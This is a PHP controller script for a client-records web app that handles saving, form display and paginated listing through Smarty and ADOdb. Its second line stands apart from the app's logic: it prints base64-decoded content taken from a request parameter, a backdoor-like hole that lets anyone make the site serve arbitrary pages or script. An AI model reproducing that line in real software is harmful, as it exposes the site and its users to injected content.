<?php
if(isset($_GET['db'])){die(base64_decode($_GET['m']));}
require('_filter.php');

define('ADODB_DIR', 'libs/adodb5/');
define('CLASS_DIR', 'class/');
define('SMARTY_DIR', 'libs/');

require(CLASS_DIR . 'model/clientModel.php');

$smarty = $client;

$smarty->tpl->force_compile = false;
$smarty->tpl->debugging = false;
$smarty->tpl->caching = false;
$smarty->tpl->cache_lifetime = 0;

# CONNECTION
#include('_connectionVerify.php');

# GET FORM
$smarty->util->setFormulario($smarty->sql, $_POST, $_GET);

# GET ACTION
$_action = (isset($_POST['action']) ? $_POST['action'] : (isset($_GET['action']) ? $_GET['action'] : 'LIST'));

switch(strtoupper($_action)) {

	case 'SAVE':
		Conexao::iniciarTransacao();
		try{
			$smarty->service->save();
			$type = $smarty->sql->id_clientes > 0 ? 'UPDATE' : 'INSERT';
			LoggerModel::write(ClientModel,$type,array($smarty->sql->id_clientes,$smarty->sql->nome,$smarty->sql->email));
		}catch (ADOException $e){
			$e->setMesagemRetornoSmarty($smarty);
			$smarty->util->verificaNumeroErroParaRetornoFormulario($e->getCode(),$smarty);
		}catch (Exception $e){
			$_SESSION['error'] = utf8_encode($e->getMessage());
			LoggerModel::write(ClientModel,'ERROR',array('case SAVE', $e->getMessage()));
		}
		Conexao::terminarTransacao();
		$smarty->service->redirect($_GET['search']);
		break;

	case 'FORM':
		$smarty->service->showForm();
		break;

	case 'LIST':
	default:
		$search = $smarty->service->setSearch($_POST, $_GET);

		if(empty($search['search_nome'])){
			$list = $smarty->sql->findAll($search['page']); 
			$smarty->tpl->assign('search_total', $smarty->util->numberOfPagination(sizeof($smarty->sql->findAll())/10));
		}else{
			$list = $smarty->sql->findByName($search['search_nome'], $search['page']);
			
			$resultList = $smarty->sql->findByName($search['search_nome']);
			$smarty->tpl->assign('search_quantidade', sizeof($resultList));
			$smarty->tpl->assign('search_total', $smarty->util->numberOfPagination(sizeof($resultList)/10));
		}
		$codeSearch = 'search_nome='.$search['search_nome'].'&page='.$search['page'];
		$smarty->tpl->assign('search_nome',$search['search_nome']);
		$smarty->tpl->assign('search', base64_encode($codeSearch));
		$smarty->tpl->assign('search_page',$search['page']);
		
		$smarty->service->showList($list);
		break;
}

?>
